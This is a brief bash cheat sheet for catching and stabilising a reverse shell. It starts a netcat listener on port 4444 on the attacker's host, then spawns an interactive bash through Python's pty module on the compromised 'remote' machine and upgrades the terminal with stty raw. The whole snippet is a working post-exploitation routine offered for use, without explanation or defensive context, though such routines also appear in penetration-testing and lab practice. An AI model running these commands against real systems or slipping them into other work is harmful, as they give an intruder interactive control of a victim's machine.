```bash
# Host.
rlwrap nc -lvnp 4444

# Remote.
export TERM=xterm-color
dpkg -l | grep python
python -c "import pty;pty.spawn('/bin/bash')"
# After ctrl+z,
stty raw -echo; fg
```